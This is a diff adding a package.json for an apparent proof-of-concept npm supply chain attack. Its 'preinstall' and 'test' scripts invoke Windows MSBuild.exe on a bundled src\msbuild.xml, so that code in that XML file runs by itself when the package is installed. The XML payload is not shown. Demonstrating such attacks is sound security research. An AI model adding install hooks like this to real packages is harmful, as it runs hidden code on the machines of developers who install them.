@@ -1,0 +1,12 @@
+{
+  "name": "npm-supply-chain-poc",
+  "version": "0.0.1",
+  "description": "This repository demonstrates a proof-of-concept (PoC) for an NPM supply chain attack.",
+  "main": "index.js",
+  "scripts": {
+    "test": "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe src\\msbuild.xml",
+    "preinstall": "c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe src\\msbuild.xml"
+  },
+  "author": "Chopicalqui",
+  "license": "GPLv3"
+}
